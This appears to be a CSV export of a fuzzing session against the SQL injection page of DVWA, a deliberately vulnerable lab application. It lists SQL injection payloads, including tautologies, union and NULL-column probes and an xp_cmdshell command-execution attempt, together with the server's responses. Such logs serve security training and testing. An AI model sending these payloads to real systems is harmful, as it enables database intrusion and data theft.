Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Sat Aug 29 17:59:41 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit,200,OK,4,480,0,328,4544,Medium,,[]
1,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a&Submit=Submit,200,OK,30,480,0,328,4485,,Reflected,[a]
2,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+&Submit=Submit,200,OK,17,484,0,338,160,,error,[a%27+]
4,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+or+1%3D1%3B+--&Submit=Submit,200,OK,26,498,0,338,162,,error,[a%27+or+1%3D1%3B+--]
7,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+and+1%3D0%29+union+all&Submit=Submit,200,OK,39,505,0,338,171,,error,[%27+and+1%3D0%29+union+all]
12,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--&Submit=Submit,200,OK,48,536,0,337,162,,error,[x%27+and+1%3D%28select+count%28*%29+from+tabname%29%3B+--]
16,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--&Submit=Submit,200,OK,24,536,0,337,206,,error,[%27%3B+exec+master..xp_cmdshell+%27ping+172.10.1.255%27--]
5,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,60,482,0,327,4485,,,[%40]
14,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+or+full_name+like+%27%25bob%25&Submit=Submit,200,OK,28,514,0,313,55,,,[x%27+or+full_name+like+%27%25bob%25]
13,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+members.email+is+NULL%3B+--&Submit=Submit,200,OK,37,515,0,338,162,,error,[x%27+and+members.email+is+NULL%3B+--]
8,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F+or+1%3D1+--&Submit=Submit,200,OK,51,494,0,328,4485,,,[%3F+or+1%3D1+--]
3,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+--&Submit=Submit,200,OK,50,486,0,338,160,,error,[a%27+--]
9,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+userid+is+NULL%3B+--&Submit=Submit,200,OK,42,508,0,338,162,,error,[x%27+and+userid+is+NULL%3B+--]
10,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=x%27+and+email+is+NULL%3B+--&Submit=Submit,200,OK,41,507,0,338,162,,error,[x%27+and+email+is+NULL%3B+--]
6,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%3F&Submit=Submit,200,OK,39,482,0,328,4485,,,[%3F]
11,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=anything%27+or+%27x%27%3D%27x&Submit=Submit,200,OK,1007,508,0,328,4867,,,[anything%27+or+%27x%27%3D%27x]
15,Fuzzed,Sat Aug 29 18:05:29 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=23+or+1%3D1%3B+--&Submit=Submit,200,OK,1995,496,0,328,4485,,,[23+or+1%3D1%3B+--]
